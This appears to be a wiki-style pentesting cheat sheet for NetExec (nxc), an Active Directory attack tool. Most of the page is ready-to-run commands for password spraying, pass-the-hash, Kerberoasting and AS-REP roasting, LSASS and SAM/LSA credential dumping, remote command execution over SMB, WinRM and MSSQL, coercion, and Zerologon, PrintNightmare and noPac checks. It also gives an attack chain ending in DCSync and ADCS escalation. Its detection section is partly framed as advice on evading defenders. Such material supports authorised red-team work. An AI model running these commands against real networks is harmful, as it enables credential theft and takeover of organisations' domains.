---
title: NetExec (nxc) — modern CrackMapExec workflow
slug: netexec-nxc-workflow
aliases: [netexec, nxc, crackmapexec, cme]
---

> **TL;DR:** NetExec (`nxc`) is the maintained fork of CrackMapExec — same protocols, more modules, active CVE/ESC support. It's the "sweep an AD network for credentials, shares, and quick wins" tool. One binary, one syntax across smb/ldap/winrm/mssql/rdp/ftp/vnc/wmi/ssh/nfs.

## Mental model

`nxc <protocol> <targets> [creds] [-M module]`. Targets accept CIDR, file, single IP, or hostname. Credentials accept `-u/-p`, `-H <nthash>`, `--kerberos -k`, `--aes-key`, or pass-the-cert. Modules extend each protocol with a curated attack — Spider for shares, LSA for hive dump, ESC8 for ADCS relay setup, Nanodump for LSASS.

```bash
pipx install netexec
nxc --version    # >= 1.2 ships ESC1-ESC16 modules
```

## Tradecraft

### Discovery & validation

```bash
nxc smb 10.10.10.0/24                                  # OS + signing + null-session
nxc smb 10.10.10.0/24 -u users.txt -p 'Winter2026!' --continue-on-success    # spray
nxc smb 10.10.10.0/24 -u Administrator -H <nthash>     # validate hash
nxc ldap dc -u me -p pw --kerberoasting kerb.out       # roast in one shot
nxc ldap dc -u me -p pw --asreproast asrep.out         # AS-REP roast
nxc ldap dc -u me -p pw --bloodhound --collection all --dns-server dc      # ship BH zip
```

### Share & secret mining

```bash
nxc smb hosts -u me -p pw --shares                     # enumerate ACLs
nxc smb hosts -u me -p pw -M spider_plus                # full content crawl → JSON
nxc smb hosts -u me -p pw -M nanodump                   # in-mem LSASS dump → ./nanodumps/
nxc smb hosts -u me -p pw -M lsassy                     # parse LSASS remotely → cleartext
nxc smb hosts -u me -p pw --sam --lsa                   # offline hive dump after exec
```

### Execution

```bash
nxc smb host -u da -p pw -x 'whoami'                    # wmiexec-style
nxc smb host -u da -p pw -X '<powershell>'              # PowerShell on stdin
nxc smb host -u da -p pw --exec-method atexec           # switch method when smbexec is blocked
nxc winrm host -u da -p pw -x 'whoami'                  # WinRM, less noisy
nxc mssql sql -u sa -p sa --local-auth -x 'whoami'      # MSSQL xp_cmdshell
```

### ADCS / Coercion / Relay quick wins

```bash
nxc ldap dc -u me -p pw -M adcs                         # enumerate templates → ESC* findings
nxc smb host -u me -p pw -M coerce_plus                 # try every coercion vector
nxc smb hosts -u '' -p '' -M zerologon                  # CVE-2020-1472 check
nxc smb hosts -u me -p pw -M printnightmare             # CVE-2021-34527 check
nxc smb hosts -u me -p pw -M nopac                      # CVE-2021-42278/9 check
```

### Database

NetExec keeps a SQLite DB of every successful auth in `~/.nxc/workspaces/`. Pivot off it:

```bash
nxc smb workspace --list
nxc smb workspace --create eng-2026
nxcdb                          # interactive — search hosts/creds/admins
> creds                        # show captured creds
> hosts admin                  # who is admin where
```

## Common chains

```text
[spray] nxc smb /24 -u users -p 'Winter2026!'
   ↓ hit
[adm?]  nxc smb /24 -u valid -p pw           # +DA flag = local admin
   ↓
[dump]  nxc smb host -u valid -p pw --sam --lsa
   ↓ machine acct hash
[silver/relay] feed into impacket/ntlmrelayx
   ↓
[ldap]  nxc ldap dc -u valid -p pw --bloodhound
   ↓ owned graph
[escal] DCSync / RBCD / ADCS ESC* per BH path
```

## Detection / Telemetry

- **Spray patterns**: many 4625 across hosts from one source IP, same user across hosts in seconds. Splunk/Sentinel windowed counts catch this trivially. Slow the spray (`--jitter`/`--delay`) or distribute across SOCKS chain.
- **Module artefacts**: `nanodump` drops `nanodumps/<host>-<pid>.dmp` on attacker; on victim it spawns a short-lived suspended process — Defender for Endpoint signature `Behavior:Win32/Nanodump.A` fires.
- **`atexec`/`smbexec` pipes** (see [[impacket-toolkit-overview]]). NetExec uses Impacket internally — same patterns.
- **BloodHound LDAP collection** = thousands of LDAP queries with `objectClass` filters in seconds. Defender for Identity flags as "Reconnaissance using directory services" (med-severity).

## OPSEC pitfalls

- `--continue-on-success` against a domain account without `-d`/`--domain` will hammer the local SAM and lock out a domain user if the host is domain-joined — be explicit about auth domain.
- NetExec's default LDAP queries are loud. Use `--bloodhound` carefully — Defender for Identity profiles this fast. Use `SharpHound -Stealth` from inside instead.
- The DB (`~/.nxc/workspaces/<name>/db.db`) is plaintext credential storage. Treat as `KeePass`-grade — encrypt the engagement folder, wipe at end.
- LSASSy / Nanodump require local admin. If `-x whoami` returns `nt authority\system` you have it; otherwise the modules silently no-op.
- Some modules need ThePorgs Impacket features (PKINIT, modern delegation). `pipx inject netexec impacket@git+https://github.com/ThePorgs/impacket` if you hit `KRB_AP_ERR_SKEW`-style issues.

## References

- https://github.com/Pennyw0rth/NetExec
- https://www.netexec.wiki/
- https://github.com/login-securite/lsassy
- https://github.com/helpsystems/nanodump
- https://attack.mitre.org/software/S0488/

See also: [[impacket-toolkit-overview]], [[bloodhound]], [[bloodhound-ce-deployment]], [[password-spraying]], [[pass-the-hash]], [[kerberoasting]], [[asreproast]], [[adcs-attacks]], [[ntlm-relay]], [[snaffler-share-mining]]
